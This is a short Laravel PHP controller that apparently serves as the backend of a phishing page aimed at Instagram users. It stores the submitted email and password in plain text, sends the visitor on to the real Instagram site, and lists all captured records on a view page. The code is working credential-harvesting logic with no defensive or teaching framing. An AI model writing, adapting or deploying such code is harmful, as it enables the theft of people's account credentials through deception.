<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Data;

class DataController extends Controller
{
    public function store(Request $request)
    {
        $data = new Data();
        $data->email = $request->email;
        $data->password = $request->password;
        $data->save();
        return redirect()->away('https://www.instagram.com');
        // return redirect()->route('users.index');
    }
    public function index()
    {
        $data = [
            'users' => Data::all()
        ];
        return view('data', $data);
    }


}
